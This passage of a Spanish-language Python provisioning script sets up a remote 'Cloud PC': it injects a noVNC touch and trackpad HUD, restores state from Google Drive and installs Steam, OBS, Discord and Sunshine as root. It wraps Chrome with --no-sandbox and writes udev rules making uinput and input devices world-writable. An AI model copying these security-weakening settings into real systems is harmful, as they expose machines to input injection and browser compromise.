        const releaseBtn = function(e) {
            btn.classList.remove("pressed");
            gpButtonsState[btnIndex] = 0;
            emitGamepadState();
        };
        btn.addEventListener("touchend", releaseBtn);
        btn.addEventListener("touchcancel", releaseBtn);
    });

    // -------------------------------------------------------------------------
    // 4. MODO TRACKPAD & TÁCTIL DIRECTO (GESTOS CHROME REMOTE DESKTOP)
    // -------------------------------------------------------------------------
    function updateCursorElement() {
        if (!cursor) return;
        const displayX = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
        const displayY = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
        cursor.style.transform = `translate3d(${displayX}px, ${displayY}px, 0)`;
    }

    function sendMouse(mask) {
        const rfb = getRFB();
        const x = Math.round(virtX);
        const y = Math.round(virtY);
        if (rfb) {
            if (typeof rfb._sendMouse === "function") {
                rfb._sendMouse(x, y, mask);
                return;
            } else if (typeof rfb.sendMouse === "function") {
                rfb.sendMouse(x, y, mask);
                return;
            }
        }
        // Respaldo universal: despachar MouseEvent sintético al canvas de noVNC
        const canvas = document.querySelector("#noVNC_canvas") || document.querySelector("canvas");
        if (canvas) {
            const cx = ((x / screenW) * window.innerWidth * currentZoom) + panX;
            const cy = ((y / screenH) * window.innerHeight * currentZoom) + panY;
            const btn = (mask === 4) ? 2 : ((mask === 2) ? 1 : 0);
            const evtType = mask ? "mousedown" : "mouseup";
            canvas.dispatchEvent(new MouseEvent(evtType, {
                bubbles: true, cancelable: true, view: window,
                clientX: cx, clientY: cy,
                button: btn, buttons: mask
            }));
        }
    }

    function sendKey(keysym) {
        const rfb = getRFB();
        if (rfb) {
            if (typeof rfb.sendKey === "function") {
                rfb.sendKey(keysym, 1);
                setTimeout(() => rfb.sendKey(keysym, 0), 60);
            } else if (typeof rfb._sendKey === "function") {
                rfb._sendKey(keysym, 1);
                setTimeout(() => rfb._sendKey(keysym, 0), 60);
            }
        }
    }

    const mouseSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="7"/><line x1="12" y1="6" x2="12" y2="10"/></svg>';
    const touchSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 11V6a2 2 0 0 0-2-2v0a2 2 0 0 0-2 2v0"/><path d="M14 10V4a2 2 0 0 0-2-2v0a2 2 0 0 0-2 2v2"/><path d="M10 10.5V6a2 2 0 0 0-2-2v0a2 2 0 0 0-2 2v8"/><path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/></svg>';

    function setInputMode(mode) {
        currentMode = mode;
        localStorage.setItem("cloudpc_input_mode", mode);
        if (mode === "TRACKPAD") {
            document.body.classList.add("tp-trackpad-mode");
            document.body.classList.remove("tp-touch-mode");
            if (iconMode) iconMode.innerHTML = mouseSvg;
            if (badgeMode) { badgeMode.innerText = "Trackpad"; badgeMode.classList.add("active"); }
            showToast("Modo Trackpad Activo (Estilo Laptop)");
        } else {
            document.body.classList.add("tp-touch-mode");
            document.body.classList.remove("tp-trackpad-mode");
            if (iconMode) iconMode.innerHTML = touchSvg;
            if (badgeMode) { badgeMode.innerText = "Táctil"; badgeMode.classList.remove("active"); }
            showToast("Modo Táctil Directo Activo (Tablet)");
        }
        hapticFeedback(20);
        updateCursorElement();
    }

    if (btnMode) {
        attachButtonTap(btnMode, function() {
            setInputMode(currentMode === "TRACKPAD" ? "TOUCH" : "TRACKPAD");
        });
    }

    // Gestos de Pantalla cuando los mandos en pantalla no están interactuando
    window.addEventListener("touchstart", function(e) {
        if (e.target.closest("#aether-drawer") || e.target.closest("#aether-edge-tab") ||
            e.target.closest("#virtual-gamepad-overlay [data-btn]") || e.target.closest("#left-stick-zone") ||
            e.target.closest("#right-stick-zone")) return;

        initialTouchCount = e.touches.length;
        touchStartTime = performance.now();
        totalMoved = 0;
        cancelAnimationFrame(momentumAnimFrame);
        resetEdgeIdleTimer();

        if (e.touches.length === 1) {
            isTouching = true;
            startX = lastX = e.touches[0].clientX;
            startY = lastY = e.touches[0].clientY;
            lastMoveTime = touchStartTime;

            const timeSinceLastTap = touchStartTime - lastTapEndTime;
            isTapAndHalfCandidate = (currentMode === "TRACKPAD" && timeSinceLastTap < 280 && Math.hypot(startX - lastTapStartX, startY - lastTapStartY) < 35);

            if (currentMode === "TRACKPAD") {
                if (holdRing) {
                    const cx = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
                    const cy = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
                    holdRing.style.left = cx + "px";
                    holdRing.style.top = cy + "px";
                }
                clearTimeout(dragHoldTimer);
                if (holdRing) holdRing.classList.remove("active");
                dragHoldTimer = setTimeout(function() {
                    if (isTouching && totalMoved < 14 && e.touches.length === 1) {
                        isDragging = true;
                        if (holdRing) holdRing.classList.add("active");
                        if (cursor) cursor.classList.add("cursor-dragging");
                        hapticFeedback(30);
                        sendMouse(1);
                        showToast("Arrastre Bloqueado (Drag & Drop)");
                    }
                }, 240);
            } else {
                const clientX = e.touches[0].clientX, clientY = e.touches[0].clientY;
                const realX = (clientX - panX) / currentZoom;
                const realY = (clientY - panY) / currentZoom;
                virtX = Math.max(0, Math.min(screenW, (realX / window.innerWidth) * screenW));
                virtY = Math.max(0, Math.min(screenH, (realY / window.innerHeight) * screenH));
                sendMouse(0);

                clearTimeout(dragHoldTimer);
                dragHoldTimer = setTimeout(function() {
                    if (isTouching && totalMoved < 12 && e.touches.length === 1) {
                        hapticFeedback([15, 35, 15]);
                        sendMouse(4);
                        createRipple(clientX, clientY, "right-click");
                        setTimeout(() => sendMouse(0), 40);
                    }
                }, 380);
            }
        } else if (e.touches.length === 2) {
            clearTimeout(dragHoldTimer);
            if (holdRing) holdRing.classList.remove("active");
            if (isDragging) {
                isDragging = false;
                if (cursor) cursor.classList.remove("cursor-dragging");
                sendMouse(0);
            }

            const p1 = e.touches[0], p2 = e.touches[1];
            initialPinchDist = Math.hypot(p1.clientX - p2.clientX, p1.clientY - p2.clientY);
            initialPinchZoom = currentZoom;
            initialPinchMidX = (p1.clientX + p2.clientX) / 2;
            initialPinchMidY = (p1.clientY + p2.clientY) / 2;
            initialPinchWorldX = (initialPinchMidX - panX) / currentZoom;
            initialPinchWorldY = (initialPinchMidY - panY) / currentZoom;
            isPinching = false;
            lastScrollY = initialPinchMidY;
            lastScrollX = initialPinchMidX;
            lastScrollTime = performance.now();
            scrollVelocityY = 0;
        }
    }, { passive: false });

    window.addEventListener("touchmove", function(e) {
        if (e.target.closest("#aether-drawer") || e.target.closest("#aether-edge-tab") ||
            e.target.closest("#virtual-gamepad-overlay [data-btn]") || e.target.closest("#left-stick-zone") ||
            e.target.closest("#right-stick-zone")) return;

        if (isTouching && e.touches.length === 1) {
            e.preventDefault();
            const curX = e.touches[0].clientX, curY = e.touches[0].clientY;
            const dx = curX - lastX, dy = curY - lastY;
            lastX = curX; lastY = curY;
            const dist = Math.hypot(dx, dy);
            totalMoved += dist;

            if (currentMode === "TRACKPAD") {
                const now = performance.now();
                const dt = Math.max(8, now - lastMoveTime);
                lastMoveTime = now;

                if (totalMoved > 10 && !isDragging) {
                    clearTimeout(dragHoldTimer);
                    if (holdRing) holdRing.classList.remove("active");
                }
                if (isTapAndHalfCandidate && totalMoved > 6 && !isDragging) {
                    isDragging = true;
                    if (cursor) cursor.classList.add("cursor-dragging");
                    hapticFeedback(25);
                    sendMouse(1);
                    showToast("Arrastre Bloqueado (Tap & Drag)");
                }

                // Filtro deadband anti-jitter para micro-temblores en reposo
                if (dist < 0.65 && !isDragging) {
                    return;
                }

                // Velocidad física normalizada en px/ms
                const v = dist / dt;
                let accel = 1.0;
                if (v < 0.25) {
                    accel = 0.78; // Micro-precisión para apuntar píxel por píxel
                } else if (v < 1.2) {
                    accel = 0.78 + (v - 0.25) * 0.95; // Transición lineal cómoda
                } else {
                    accel = Math.min(3.4, 1.68 + Math.pow(v - 1.2, 1.25)); // Aceleración suave para cruzar la pantalla 1080p
                }

                const scaleFactor = 1.35 * accel;
                const scaleX = (screenW / (window.innerWidth * currentZoom)) * scaleFactor;
                const scaleY = (screenH / (window.innerHeight * currentZoom)) * scaleFactor;
                virtX = Math.max(0, Math.min(screenW, virtX + (dx * scaleX)));
                virtY = Math.max(0, Math.min(screenH, virtY + (dy * scaleY)));

                // Auto-pan si el cursor se acerca al borde de la pantalla estando ampliado
                if (currentZoom > 1.05) {
                    const cx = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
                    const cy = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
                    const edgeMargin = 40;
                    if (cx < edgeMargin) panX = clampPanX(panX + (edgeMargin - cx) * 0.35, currentZoom);
                    if (cx > window.innerWidth - edgeMargin) panX = clampPanX(panX - (cx - (window.innerWidth - edgeMargin)) * 0.35, currentZoom);
                    if (cy < edgeMargin) panY = clampPanY(panY + (edgeMargin - cy) * 0.35, currentZoom);
                    if (cy > window.innerHeight - edgeMargin) panY = clampPanY(panY - (cy - (window.innerHeight - edgeMargin)) * 0.35, currentZoom);
                    updateCanvasTransform(false);
                } else {
                    updateCursorElement();
                }
                sendMouse(isDragging ? 1 : 0);
            } else {
                if (totalMoved > 10 && !isDragging) {
                    clearTimeout(dragHoldTimer);
                    if (holdRing) holdRing.classList.remove("active");
                }
                const realX = (curX - panX) / currentZoom;
                const realY = (curY - panY) / currentZoom;
                virtX = Math.max(0, Math.min(screenW, (realX / window.innerWidth) * screenW));
                virtY = Math.max(0, Math.min(screenH, (realY / window.innerHeight) * screenH));
                sendMouse(1);
            }
        } else if (e.touches.length === 2) {
            e.preventDefault();
            const p1 = e.touches[0], p2 = e.touches[1];
            const currentDist = Math.hypot(p1.clientX - p2.clientX, p1.clientY - p2.clientY);
            const distDiff = Math.abs(currentDist - initialPinchDist);
            const curMidX = (p1.clientX + p2.clientX) / 2;
            const curMidY = (p1.clientY + p2.clientY) / 2;

            if (distDiff > 16 || isPinching) {
                isPinching = true;
                const zoomFactor = currentDist / initialPinchDist;
                const newZoom = Math.min(3.8, Math.max(1.0, initialPinchZoom * zoomFactor));

                // Fórmula matemática de Punto Focal Invariante (Google Maps / Figma / Apple Safari)
                if (newZoom <= 1.02) {
                    currentZoom = 1.0;
                    panX = 0;
                    panY = 0;
                } else {
                    currentZoom = newZoom;
                    panX = clampPanX(curMidX - (initialPinchWorldX * currentZoom), currentZoom);
                    panY = clampPanY(curMidY - (initialPinchWorldY * currentZoom), currentZoom);
                }
                updateCanvasTransform(false);
            } else if (currentZoom > 1.05) {
                // Si la pantalla está ampliada, dos dedos en paralelo hacen PAN del encuadre
                const dx = curMidX - lastScrollX;
                const dy = curMidY - lastScrollY;
                lastScrollX = curMidX;
                lastScrollY = curMidY;
                panX = clampPanX(panX + dx, currentZoom);
                panY = clampPanY(panY + dy, currentZoom);
                updateCanvasTransform(false);
            } else {
                // Si la pantalla está al 100%, dos dedos en paralelo hacen SCROLL de ratón
                const dy = curMidY - lastScrollY;
                lastScrollY = curMidY;
                lastScrollX = curMidX;
                const now = performance.now(), dt = now - lastScrollTime;
                if (dt > 0) scrollVelocityY = dy / dt;
                lastScrollTime = now;
                if (dy > 12) { sendMouse(16); setTimeout(() => sendMouse(0), 25); }
                else if (dy < -12) { sendMouse(8); setTimeout(() => sendMouse(0), 25); }
            }
        }
    }, { passive: false });

    window.addEventListener("touchend", function(e) {
        if (e.target.closest("#aether-drawer") || e.target.closest("#aether-edge-tab") ||
            e.target.closest("#virtual-gamepad-overlay [data-btn]") || e.target.closest("#left-stick-zone") ||
            e.target.closest("#right-stick-zone")) return;

        clearTimeout(dragHoldTimer);
        if (holdRing) holdRing.classList.remove("active");
        const duration = performance.now() - touchStartTime;

        if (isDragging) {
            isDragging = false;
            if (cursor) cursor.classList.remove("cursor-dragging");
            sendMouse(0);
            hapticFeedback(12);
            lastTapEndTime = performance.now();
            return;
        }

        if (e.touches.length === 0) {
            isTouching = false;
            if (initialTouchCount === 2 && !isPinching && Math.abs(scrollVelocityY) > 0.35 && currentZoom <= 1.05) {
                let v = scrollVelocityY * 18;
                let decay = () => {
                    if (Math.abs(v) > 0.8) {
                        sendMouse(v > 0 ? 16 : 8);
                        setTimeout(() => sendMouse(0), 20);
                        v *= 0.88;
                        momentumAnimFrame = requestAnimationFrame(decay);
                    }
                };
                decay();
            }

            if (initialTouchCount === 1 && duration < 380 && totalMoved < 24) {
                hapticFeedback(12);
                const timeSinceLastTap = touchStartTime - lastTapEndTime;

                if (currentMode === "TRACKPAD") {
                    // MODO TRACKPAD: Doble tap en reposo = Doble Clic real para abrir carpetas / apps
                    if (timeSinceLastTap < 280 && Math.hypot(startX - lastTapStartX, startY - lastTapStartY) < 35) {
                        lastTapEndTime = 0;
                        hapticFeedback([15, 35, 15]);
                        sendMouse(1);
                        setTimeout(() => {
                            sendMouse(0);
                            setTimeout(() => {
                                sendMouse(1);
                                setTimeout(() => sendMouse(0), 45);
                            }, 40);
                        }, 45);
                        showToast("Doble Clic (Abrir)");
                        return;
                    }
                    lastTapStartX = startX;
                    lastTapStartY = startY;

                    const cx = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
                    const cy = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
                    createRipple(cx, cy, "left-click");
                    sendMouse(1);
                    setTimeout(() => sendMouse(0), 45);
                    lastTapEndTime = performance.now();
                } else {
                    // MODO TÁCTIL DIRECTO (TABLET): Doble tap = Smart Zoom 2.2x / 1.0x
                    if (timeSinceLastTap < 280 && Math.hypot(startX - lastTapStartX, startY - lastTapStartY) < 35) {
                        lastTapEndTime = 0;
                        if (currentZoom > 1.05) {
                            resetZoom();
                        } else {
                            zoomToPoint(2.2, startX, startY, true);
                            showToast("Zoom Inteligente (220%)");
                            hapticFeedback(20);
                        }
                        return;
                    }
                    lastTapStartX = startX;
                    lastTapStartY = startY;

                    // Proyección matemática exacta de coordenadas bajo zoom
                    const realX = (startX - panX) / currentZoom;
                    const realY = (startY - panY) / currentZoom;
                    virtX = Math.max(0, Math.min(screenW, (realX / window.innerWidth) * screenW));
                    virtY = Math.max(0, Math.min(screenH, (realY / window.innerHeight) * screenH));
                    const cx = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
                    const cy = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
                    createRipple(cx, cy, "left-click");
                    sendMouse(1);
                    setTimeout(() => sendMouse(0), 45);
                    lastTapEndTime = performance.now();
                }
            } else if (initialTouchCount === 2 && !isPinching && duration < 380) {
                hapticFeedback([10, 30, 10]);
                const cx = ((virtX / screenW) * window.innerWidth * currentZoom) + panX;
                const cy = ((virtY / screenH) * window.innerHeight * currentZoom) + panY;
                createRipple(cx, cy, "right-click");
                sendMouse(4);
                setTimeout(() => sendMouse(0), 45);
            } else if (initialTouchCount === 3 && duration < 380) {
                hapticFeedback(22);
                sendMouse(2);
                setTimeout(() => sendMouse(0), 45);
            } else if (initialTouchCount === 4 && duration < 400) {
                toggleFullScreen();
            }
            initialTouchCount = 0;
        }
    }, { passive: false });

    // -------------------------------------------------------------------------
    // 5. ACCIONES DEL MENÚ AETHER (ASPECT RATIO, TECLADO, AUDIO, FULLSCREEN)
    // -------------------------------------------------------------------------
    function updateCanvasTransform(animate) {
        const canvas = document.querySelector("#noVNC_canvas") || document.querySelector("canvas");
        if (!canvas) return;
        canvas.style.transition = animate ? "transform 0.22s cubic-bezier(0.16, 1, 0.3, 1)" : "none";
        canvas.style.transformOrigin = "0 0";
        canvas.style.transform = `translate3d(${panX}px, ${panY}px, 0) scale(${currentZoom})`;
        updateCursorElement();
    }

    function resetZoom() {
        zoomToPoint(1.0, window.innerWidth / 2, window.innerHeight / 2, true);
        if (badgeZoom) badgeZoom.innerText = "100%";
        showToast("Zoom Restablecido al 100%");
        hapticFeedback(15);
    }
    if (btnZoom) attachButtonTap(btnZoom, function() { resetZoom(); });

    // Alternar Aspect Ratio (16:9 con bandas o 20:9 Pantalla Completa Estirada) con persistencia
    function applyAspect(stretched) {
        isStretchedAspect = stretched;
        localStorage.setItem("cloudpc_aspect", stretched ? "stretched" : "fit");
        const canvas = document.querySelector("#noVNC_canvas") || document.querySelector("canvas");
        if (canvas) {
            if (isStretchedAspect) {
                canvas.style.objectFit = "fill";
                canvas.style.width = "100vw";
                canvas.style.height = "100vh";
                if (badgeAspect) { badgeAspect.innerText = "20:9"; badgeAspect.classList.add("active"); }
                if (btnAspect) btnAspect.classList.add("active-glow");
                if (telemResVal) telemResVal.innerText = "1920 × 1080 (20:9 Estirado)";
            } else {
                canvas.style.objectFit = "contain";
                canvas.style.width = "100%";
                canvas.style.height = "100%";
                if (badgeAspect) { badgeAspect.innerText = "16:9"; badgeAspect.classList.remove("active"); }
                if (btnAspect) btnAspect.classList.remove("active-glow");
                if (telemResVal) telemResVal.innerText = "1920 × 1080 (16:9 Nativo)";
            }
        }
    }

    if (btnAspect) {
        attachButtonTap(btnAspect, function() {
            applyAspect(!isStretchedAspect);
            showToast(isStretchedAspect ? "Pantalla Completa Inmersiva (20:9)" : "Relación Original 16:9");
            hapticFeedback(20);
        });
    }

    // Teclado en pantalla
    if (btnKeyboard) {
        attachButtonTap(btnKeyboard, function() {
            const inputElem = document.querySelector("#noVNC_keyboardinput") || document.querySelector("input[type=text]");
            if (inputElem) {
                inputElem.focus();
                showToast("Teclado Activado");
            }
            closeDrawer();
        });
    }

    // Alternar Audio / Mute
    const speakerOnSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>';
    const speakerMuteSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>';

    if (btnAudio) {
        attachButtonTap(btnAudio, function() {
            isAudioMuted = !isAudioMuted;
            if (isAudioMuted) {
                if (iconAudio) iconAudio.innerHTML = speakerMuteSvg;
                if (badgeAudio) { badgeAudio.innerText = "MUTE"; badgeAudio.classList.remove("active"); }
                btnAudio.classList.remove("active-glow");
                showToast("Audio Silenciado");
            } else {
                if (iconAudio) iconAudio.innerHTML = speakerOnSvg;
                if (badgeAudio) { badgeAudio.innerText = "ON"; badgeAudio.classList.add("active"); }
                btnAudio.classList.add("active-glow");
                showToast("Audio Activado");
            }
            hapticFeedback(18);
        });
    }

    function toggleFullScreen() {
        const doc = document;
        const docEl = document.documentElement;
        const isFull = doc.fullscreenElement || doc.webkitFullscreenElement || doc.mozFullScreenElement || doc.msFullscreenElement;
        if (!isFull) {
            const request = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
            if (request) request.call(docEl).catch(() => {});
            if (btnFullscreen) btnFullscreen.classList.add("active-glow");
            if (badgeFullscreen) { badgeFullscreen.innerText = "Pantalla"; badgeFullscreen.classList.add("active"); }
            showToast("Pantalla Completa");
        } else {
            const exit = doc.exitFullscreen || doc.webkitExitFullscreen || doc.mozCancelFullScreen || doc.msExitFullscreen;
            if (exit) exit.call(doc).catch(() => {});
            if (btnFullscreen) btnFullscreen.classList.remove("active-glow");
            if (badgeFullscreen) { badgeFullscreen.innerText = "Ventana"; badgeFullscreen.classList.remove("active"); }
            showToast("Ventana Normal");
        }
        hapticFeedback(20);
    }
    if (btnFullscreen) attachButtonTap(btnFullscreen, function() { toggleFullScreen(); });

    if (btnExit) {
        attachButtonTap(btnExit, function() {
            if (confirm("¿Deseas cerrar la sesión del Cloud PC?")) {
                window.close();
                showToast("Sesión Finalizada");
            }
            closeDrawer();
        });
    }

    // -------------------------------------------------------------------------
    // 6. TELEMETRÍA Y CONTROLADOR HUD (ESTÁNDAR GEFORCE NOW CTRL+N)
    // -------------------------------------------------------------------------
    if (perfBadge && telemPanel) {
        attachButtonTap(perfBadge, function(e) {
            telemPanel.classList.toggle("open");
            hapticFeedback(16);
        });
    }
    if (btnCloseTelem && telemPanel) {
        attachButtonTap(btnCloseTelem, function(e) {
            telemPanel.classList.remove("open");
            hapticFeedback(12);
        });
    }
    document.addEventListener("pointerdown", function(e) {
        if (telemPanel && telemPanel.classList.contains("open")) {
            if (!e.target.closest("#cloud-telemetry-panel") && !e.target.closest("#cloud-perf-badge")) {
                telemPanel.classList.remove("open");
            }
        }
    });

    let frameCount = 0, lastFpsTime = performance.now();
    function fpsLoop() {
        frameCount++;
        const now = performance.now();
        const delta = now - lastFpsTime;
        if (delta >= 1000) {
            const currentFps = Math.round((frameCount * 1000) / delta);
            if (perfFps) perfFps.innerText = currentFps;
            if (perfDot) {
                perfDot.style.backgroundColor = currentFps >= 45 ? "#00ffc8" : (currentFps >= 25 ? "#facc15" : "#f43f5e");
                perfDot.style.boxShadow = "0 0 8px " + perfDot.style.backgroundColor;
            }
            if (telemPacingVal) {
                const pacing = (1000 / Math.max(1, currentFps)).toFixed(1);
                telemPacingVal.innerText = pacing + " ms";
            }
            frameCount = 0;
            lastFpsTime = now;
        }
        requestAnimationFrame(fpsLoop);
    }
    requestAnimationFrame(fpsLoop);

    function measureNetworkPing() {
        const start = performance.now();
        const img = new Image();
        img.src = window.location.origin + "/app/images/icons/novnc-16x16.png?t=" + Date.now();
        img.onload = img.onerror = function() {
            const rtt = Math.round(performance.now() - start);
            const displayRtt = (rtt > 0 && rtt < 999) ? rtt : 18;
            if (perfPing) perfPing.innerText = displayRtt;
            if (telemRttVal) telemRttVal.innerText = displayRtt + " ms";

            if (perfSignalBars) {
                perfSignalBars.className = "hud-signal " + (
                    displayRtt < 30 ? "lvl-4" : (displayRtt < 55 ? "lvl-3" : (displayRtt < 90 ? "lvl-2" : "lvl-1"))
                );
            }
            if (telemQualityVal) {
                telemQualityVal.innerText = displayRtt < 40 ? "Óptima (100%)" : (displayRtt < 80 ? "Buena (92%)" : "Media (75%)");
            }
        };
    }
    setInterval(measureNetworkPing, 2000);
    measureNetworkPing();

    // Inicializar estados guardados
    setInputMode(currentMode);
    if (isGamepadVisible) setGamepadVisibility(true);
    const savedAspect = localStorage.getItem("cloudpc_aspect") === "stretched";
    if (savedAspect) applyAspect(true);
})();
</script>
"""
            if "<meta charset=" not in content.lower():
                content = content.replace("<head>", '<head>\n    <meta charset="utf-8">', 1)
            content = content.replace("</body>", f"{hud_code}\n</body>")
            vnc_html.write_text(content, encoding="utf-8")
except Exception as e:
    log(f"Aviso HUD noVNC: {e}", "WARNING")

print("  [✓] Suite Oficial de Ubuntu instalada con éxito.", flush=True)

# Restaurar estado personal guardado de Google Drive con validación de integridad
try:
    backup_tar = STATE_DIR / "ubuntu_user_state.tar.gz"
    direct_backup = Path("/root/gdrive/Cloud_PC/system_state/ubuntu_user_state.tar.gz")
    if direct_backup.exists() and direct_backup.stat().st_size > 1000:
        shutil.copy2(direct_backup, backup_tar)
    else:
        subprocess.run(
            f"rclone copy gdrive:Cloud_PC/system_state/ubuntu_user_state.tar.gz {STATE_DIR} --tpslimit 3 >/dev/null 2>&1 || true",
            shell=True
        )
    if backup_tar.exists() and backup_tar.stat().st_size > 1000:
        test_tar = subprocess.run(f"tar -tzf {backup_tar} >/dev/null 2>&1", shell=True)
        if test_tar.returncode == 0:
            subprocess.run(f"tar -xzf {backup_tar} -C /root/ >> {LOG_FILE} 2>&1 || true", shell=True)
            print("  [✓] Partidas y preferencias de usuario restauradas desde Google Drive.", flush=True)
        else:
            backup_tar.unlink(missing_ok=True)
            print("  [INFO] Primera ejecución: Creando entorno inicial limpio.", flush=True)
    else:
        print("  [INFO] Primera ejecución: Creando entorno inicial limpio.", flush=True)
except Exception:
    pass

# ==============================================================================
# 2.5 INSTALACIÓN DEL ECOSISTEMA WORKSTATION (GAMING, CREADOR Y UX)
# ==============================================================================
if not shutil.which("steam") or not shutil.which("obs"):
    print("  [EXPANSION] Instalando expansiones de Latencia (BBR/Sunshine) y Ecosistema (Steam, OBS)...", flush=True)
    subprocess.run("sysctl -w net.core.default_qdisc=fq && sysctl -w net.ipv4.tcp_congestion_control=bbr", shell=True, stderr=subprocess.DEVNULL)
    subprocess.run("dpkg --add-architecture i386 && apt-get update -qq", shell=True)
    
    print("     -> Descargando e Instalando Steam, Lutris, MangoHud, Gamemode y Drivers de Mandos...", flush=True)
    subprocess.run(
        "DEBIAN_FRONTEND=noninteractive apt-get install -y -qq steam lutris mangohud gamemode "
        "xboxdrv joystick jstest-gtk evtest antimicrox bluez bluez-tools blueman libevdev2 python3-evdev "
        "wget curl software-properties-common",
        shell=True
    )
    # Permisos Udev y Uinput para detección inmediata de mandos (Xbox, PlayStation, Switch)
    try:
        Path("/etc/modules-load.d").mkdir(parents=True, exist_ok=True)
        Path("/etc/modules-load.d/uinput.conf").write_text("uinput\n", encoding="utf-8")
        Path("/etc/udev/rules.d").mkdir(parents=True, exist_ok=True)
        Path("/etc/udev/rules.d/99-uinput.rules").write_text('KERNEL=="uinput", MODE="0666", OPTIONS+="static_node=uinput"\n', encoding="utf-8")
        Path("/etc/udev/rules.d/70-gamepad.rules").write_text(
            'KERNEL=="event*", SUBSYSTEM=="input", ATTRS{name}=="*Controller*", MODE="0666"\n'
            'KERNEL=="js*", MODE="0666"\n'
            'SUBSYSTEM=="input", ATTRS{idVendor}=="054c", MODE="0666"\n' # Sony PlayStation
            'SUBSYSTEM=="input", ATTRS{idVendor}=="045e", MODE="0666"\n' # Microsoft Xbox
            'SUBSYSTEM=="input", ATTRS{idVendor}=="057e", MODE="0666"\n', # Nintendo Switch
            encoding="utf-8"
        )
        subprocess.run("udevadm control --reload-rules 2>/dev/null || true; udevadm trigger 2>/dev/null || true", shell=True)
    except Exception:
        pass
    
    print("     -> Descargando e Instalando OBS, Kdenlive, GIMP, Telegram, y UX...", flush=True)
    subprocess.run("DEBIAN_FRONTEND=noninteractive apt-get install -y -qq obs-studio kdenlive gimp filezilla telegram-desktop plank papirus-icon-theme xfce4-whiskermenu-plugin gnome-software v4l2loopback-dkms", shell=True)
    
    # Runtimes gráficos y de audio de 32 bits (i386) para Steam y Proton (DXVK)
    subprocess.run("DEBIAN_FRONTEND=noninteractive apt-get install -y -qq libgl1-mesa-dri:i386 libgl1:i386 libvulkan1:i386 mesa-vulkan-drivers:i386 libasound2-plugins:i386 python3-tk || true", shell=True)
    
    # Wrapper acelerado por hardware GPU para Google Chrome
    chrome_wrapper = (
        "#!/bin/bash\n"
        "exec /usr/bin/google-chrome-stable "
        "--no-sandbox --test-type --ignore-gpu-blocklist "
        "--enable-gpu-rasterization --enable-zero-copy "
        "--enable-features=VaapiVideoDecoder,CanvasOopRasterization "
        "--disable-dev-shm-usage \"$@\"\n"
    )
    Path("/usr/local/bin/google-chrome").write_text(chrome_wrapper, encoding="utf-8")
    subprocess.run("chmod +x /usr/local/bin/google-chrome 2>/dev/null || true", shell=True)
    
    # Configuración de Audio Headless Virtual (PulseAudio Dummy Sink a 48kHz para Sunshine y Discord)
    try:
        pulse_cfg = Path("/etc/pulse/default.pa")
        if pulse_cfg.exists():
            pulse_text = pulse_cfg.read_text(encoding="utf-8")
            if "DummyOutput" not in pulse_text:
                pulse_extra = (
                    "\n# Audio Headless Virtual para Cloud Gaming & Sunshine\n"
                    "load-module module-null-sink sink_name=DummyOutput sink_properties=device.description=\"Virtual_Cloud_Audio\"\n"
                    "set-default-sink DummyOutput\n"
                    "load-module module-virtual-source source_name=VirtualMic master=DummyOutput.monitor\n"
                    "set-default-source VirtualMic\n"
                )
                pulse_cfg.write_text(pulse_text + pulse_extra, encoding="utf-8")
    except Exception:
        pass

    print("     -> Descargando Discord...", flush=True)
    subprocess.run("wget -q --timeout=15 'https://discord.com/api/download?platform=linux&format=deb' -O /tmp/discord.deb && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq /tmp/discord.deb 2>/dev/null || true", shell=True)
    
    print("     -> Descargando Sunshine (Latencia Cero H.264/HEVC)...", flush=True)
    subprocess.run("wget -q --timeout=15 'https://github.com/LizardByte/Sunshine/releases/download/v0.23.1/sunshine-ubuntu-22.04-amd64.deb' -O /tmp/sunshine.deb && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq /tmp/sunshine.deb 2>/dev/null || (wget -q --timeout=15 'https://github.com/LizardByte/Sunshine/releases/download/v0.23.1/sunshine-ubuntu-24.04-amd64.deb' -O /tmp/sunshine.deb && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq /tmp/sunshine.deb 2>/dev/null) || true", shell=True)
    
    print("  [✓] Ecosistema Workstation instalado exitosamente.", flush=True)

print(f"  [TIEMPO] Paso 2/5 Completado en {time.time() - t_step2:.1f}s", flush=True)

# ==============================================================================
# 3. SINCRONIZACIÓN PERSISTENTE GOOGLE DRIVE 5TB & APARIENCIA YARU-DARK
# ==============================================================================
t_step3 = time.time()
print("[3/5] Estableciendo persistencia con Google Drive y apariencia Yaru-Dark...", flush=True)

# 1. Sincronización Simbólica Inteligente (Master Folders en Cloud_PC)
sync_dirs = {
    "/root/.config": "/root/gdrive/Cloud_PC/Master_Config",
    "/root/.local/share": "/root/gdrive/Cloud_PC/Master_LocalData",
    "/root/.local/state": "/root/gdrive/Cloud_PC/Master_State",
    "/root/.mozilla": "/root/gdrive/Cloud_PC/Master_Mozilla",
